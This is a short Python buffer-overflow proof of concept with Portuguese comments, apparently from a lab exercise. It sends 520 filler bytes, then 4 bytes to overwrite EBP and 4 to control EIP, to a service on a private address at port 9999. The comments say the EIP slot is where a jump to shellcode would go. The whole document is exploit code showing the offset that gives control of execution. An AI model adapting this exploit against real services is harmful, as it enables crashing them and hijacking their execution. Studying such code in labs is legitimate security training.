import socket
	
ip = "192.168.9.2"
port = 9999

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((ip,port))
	
# Espaco normal do programa, reservado pelo programador
buffer = b"A" * 520

# A partir da posicao 521, ja crasha a aplicacao. Assim, preencho todos os 4 bytes do EBP (base da pilha)
buffer+= b"B" * 4

# Aqui estou de fato controlando o EIP (aponta proxima instrucao do programa/pilha) assim, aqui daria um JMP
# para meu shellcode
buffer+= b"C" * 4

print("[+] Enviando Buffer de 520 'A', 4 'B' e 4 'C' [+]")	
client.send(buffer)

# print(client.recv(1024))
	
# client.close()
			
 
